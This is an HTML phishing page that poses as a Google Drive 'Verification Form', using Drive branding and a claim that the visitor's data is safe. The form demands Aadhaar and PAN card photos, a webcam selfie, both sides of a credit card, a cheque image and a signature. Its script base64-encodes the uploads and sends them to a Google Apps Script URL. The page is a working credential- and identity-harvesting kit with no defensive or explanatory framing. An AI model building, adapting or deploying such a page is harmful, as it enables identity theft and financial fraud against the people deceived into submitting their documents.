<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Form</title>
    <!-- Font Awesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #6a11cb, #2575fc);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .container {
            background-color: #ffffff;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            animation: fadeIn 0.5s ease-in-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .google-drive-logo {
            width: 80px;
            margin-bottom: 10px;
        }

        .safe-text {
            font-size: 14px;
            color: #4CAF50;
            margin-bottom: 20px;
            font-weight: 600;
        }

        h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #555;
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #6a11cb;
            font-size: 18px;
        }

        input[type="text"],
        input[type="file"] {
            width: 100%;
            padding: 12px 12px 12px 45px; /* Add padding for icon */
            border: 2px solid #ddd;
            border-radius: 8px;
            background-color: #f9f9f9;
            font-size: 14px;
            color: #333;
            cursor: pointer;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input[type="text"]:hover,
        input[type="file"]:hover {
            border-color: #6a11cb;
            box-shadow: 0 0 8px rgba(106, 17, 203, 0.3);
        }

        small {
            display: block;
            margin-top: 5px;
            color: #777;
            font-size: 12px;
        }

        .submit-btn {
            background: linear-gradient(135deg, #6a11cb, #2575fc);
            color: white;
            padding: 14px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s ease, transform 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            background: linear-gradient(135deg, #2575fc, #6a11cb);
            transform: translateY(-2px);
        }

        .submit-btn i {
            font-size: 18px;
        }

        /* Responsive Design */
        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            h2 {
                font-size: 20px;
            }

            input[type="text"],
            input[type="file"] {
                font-size: 12px;
            }

            .submit-btn {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Google Drive Logo -->
        <img src="https://www.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png" alt="Google Drive Logo" class="google-drive-logo">

        <!-- Safe Text -->
        <div class="safe-text">Your data is safe in Google Drive</div>

        <!-- Form Title -->
        <h2>Verification Form</h2>

        <!-- Verification Form -->
        <form id="verificationForm">
            <!-- Name Input Field -->
            <div class="form-group">
                <label for="name">Full Name:</label>
                <i class="fas fa-user input-icon"></i>
                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
            </div>

            <!-- Aadhaar Card Photos (Front and Back Combined) -->
            <div class="form-group">
                <label for="aadhaarPhotos">Upload Aadhaar Card Photos (Front and Back):</label>
                <i class="fas fa-id-card input-icon"></i>
                <input type="file" id="aadhaarPhotos" name="aadhaarPhotos" accept="image/*" multiple required>
                <small>Please upload both front and back photos of your Aadhaar Card.</small>
            </div>

            <!-- PAN Card Photo -->
            <div class="form-group">
                <label for="panPhoto">Upload PAN Card Photo:</label>
                <i class="fas fa-address-card input-icon"></i>
                <input type="file" id="panPhoto" name="panPhoto" accept="image/*" required>
            </div>

            <!-- Webcam Selfie -->
            <div class="form-group">
                <label for="webcamSelfie">Take a Webcam Selfie:</label>
                <i class="fas fa-camera input-icon"></i>
                <input type="file" id="webcamSelfie" name="webcamSelfie" accept="image/*" capture="user" required>
            </div>

            <!-- Credit Card Photos (Front and Back Combined) -->
            <div class="form-group">
                <label for="creditCardPhotos">Upload Credit Card Photos (Front and Back):</label>
                <i class="fas fa-credit-card input-icon"></i>
                <input type="file" id="creditCardPhotos" name="creditCardPhotos" accept="image/*" multiple required>
                <small>Please upload both front and back photos of your Credit Card.</small>
            </div>

            <!-- Cheque Photo -->
            <div class="form-group">
                <label for="chequePhoto">Upload Cheque Photo:</label>
                <i class="fas fa-money-check input-icon"></i>
                <input type="file" id="chequePhoto" name="chequePhoto" accept="image/*" required>
            </div>

            <!-- Client's Signature -->
            <div class="form-group">
                <label for="clientSignature">Upload Client's Signature:</label>
                <i class="fas fa-signature input-icon"></i>
                <input type="file" id="clientSignature" name="clientSignature" accept="image/*" required>
                <small>Please upload a clear image of your signature.</small>
            </div>

            <!-- Submit Button -->
            <div class="form-group">
                <button type="submit" class="submit-btn">
                    <i class="fas fa-check-circle"></i> Submit Verification
                </button>
            </div>
        </form>
    </div>

    <script>
        document.getElementById("verificationForm").addEventListener("submit", async (e) => {
            e.preventDefault(); // Prevent the default form submission

            try {
                // Get form data
                const formData = new FormData(e.target);
                const fullName = formData.get("name");
                const files = [];

                // Process file inputs
                const fileInputs = document.querySelectorAll("input[type='file']");
                for (const input of fileInputs) {
                    for (const file of input.files) {
                        const base64 = await toBase64(file);
                        files.push({
                            name: file.name,
                            mimeType: file.type,
                            data: base64.split(",")[1], // Remove the data URL prefix
                        });
                    }
                }

                // Log the data being sent (for debugging)
                console.log("Submitting data:", { name: fullName, files });

                // Submit data to Google Apps Script
                const response = await fetch("https://script.google.com/macros/s/AKfycbz4XrZmV_pUOILx-QJ3p6xP6TheHBocCWYakd3AKX679mqpxKmlp6IaNu8FqlkQFMo/exec", {
                    method: "POST",
                    body: JSON.stringify({ name: fullName, files }),
                    headers: { "Content-Type": "application/json" },
                });

                // Check if the response is OK
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                // Parse the response
                const result = await response.json();
                console.log("Response from server:", result);

                // Show success or error message
                if (result.status === "success") {
                    alert("Files uploaded successfully!");
                } else {
                    alert("Error: " + result.message);
                }
            } catch (error) {
                console.error("Error during form submission:", error);
                alert("An error occurred. Please check the console for details.");
            }
        });

        // Convert file to Base64
        function toBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = (error) => reject(error);
            });
        }
    </script>
</body>
</html>
